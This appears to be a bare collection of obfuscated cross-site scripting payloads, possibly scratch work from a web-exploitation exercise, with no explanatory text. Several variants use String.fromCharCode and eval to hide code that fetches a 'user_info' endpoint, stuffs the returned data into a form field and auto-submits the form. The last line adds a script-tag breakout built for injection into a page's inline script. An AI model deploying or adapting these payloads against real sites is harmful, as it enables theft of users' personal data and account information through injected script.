jQuery.get(String.fromCharCode(117,115,101,114,95,105,110,102,111), function(data, status, jqxhr) {eval(String.fromCharCode(99,111,110,115,111,108,101,46,108,111,103,40,74,83,79,78,46,115,116,114,105,110,103,105,102,121,40,100,97,116,97,41,46,114,101,112,108,97,99,101,40,47,39,47,103,44,32,39,113,117,111,116,101,39,41,41,59));});


var d = JSON.stringify(data).replace(/'/g, 'quote'); document.forms[0].elements[3].value = d; document.forms[0].submit();

jQuery.get(String.fromCharCode(117,115,101,114,95,105,110,102,111), function(data, status, jqxhr) {var d = JSON.stringify(data).replace(/'/g, 'quote'); document.forms[0].elements[3].value = d.replace(/"/g,'double-quote'); document.forms[0].submit();});

var d = JSON.stringify(data).replace(/'/g, 'quote'); document.forms[0].elements[3].value = d.replace(/"/g,'double-quote'); document.forms[0].submit();

eval(String.fromCharCode(118,97,114,32,100,32,61,32,74,83,79,78,46,115,116,114,105,110,103,105,102,121,40,100,97,116,97,41,46,114,101,112,108,97,99,101,40,47,39,47,103,44,32,39,113,117,111,116,101,39,41,59,32,100,111,99,117,109,101,110,116,46,102,111,114,109,115,91,48,93,46,101,108,101,109,101,110,116,115,91,51,93,46,118,97,108,117,101,32,61,32,100,46,114,101,112,108,97,99,101,40,47,34,47,103,44,39,100,111,117,98,108,101,45,113,117,111,116,101,39,41,59,32,100,111,99,117,109,101,110,116,46,102,111,114,109,115,91,48,93,46,115,117,98,109,105,116,40,41,59));

jQuery.get(String.fromCharCode(117,115,101,114,95,105,110,102,111), function(data, status, jqxhr) {eval(String.fromCharCode(118,97,114,32,100,32,61,32,74,83,79,78,46,115,116,114,105,110,103,105,102,121,40,100,97,116,97,41,46,114,101,112,108,97,99,101,40,47,39,47,103,44,32,39,113,117,111,116,101,39,41,59,32,100,111,99,117,109,101,110,116,46,102,111,114,109,115,91,48,93,46,101,108,101,109,101,110,116,115,91,51,93,46,118,97,108,117,101,32,61,32,100,46,114,101,112,108,97,99,101,40,47,34,47,103,44,39,100,111,117,98,108,101,45,113,117,111,116,101,39,41,59,32,100,111,99,117,109,101,110,116,46,102,111,114,109,115,91,48,93,46,115,117,98,109,105,116,40,41,59));});

ass }];</script><script>jQuery.get(String.fromCharCode(117,115,101,114,95,105,110,102,111), function(data, status, jqxhr) {eval(String.fromCharCode(118,97,114,32,100,32,61,32,74,83,79,78,46,115,116,114,105,110,103,105,102,121,40,100,97,116,97,41,46,114,101,112,108,97,99,101,40,47,39,47,103,44,32,39,113,117,111,116,101,39,41,59,32,100,111,99,117,109,101,110,116,46,102,111,114,109,115,91,48,93,46,101,108,101,109,101,110,116,115,91,51,93,46,118,97,108,117,101,32,61,32,100,46,114,101,112,108,97,99,101,40,47,34,47,103,44,39,100,111,117,98,108,101,45,113,117,111,116,101,39,41,59,32,100,111,99,117,109,101,110,116,46,102,111,114,109,115,91,48,93,46,115,117,98,109,105,116,40,41,59));});</script><script> var t = [{

--


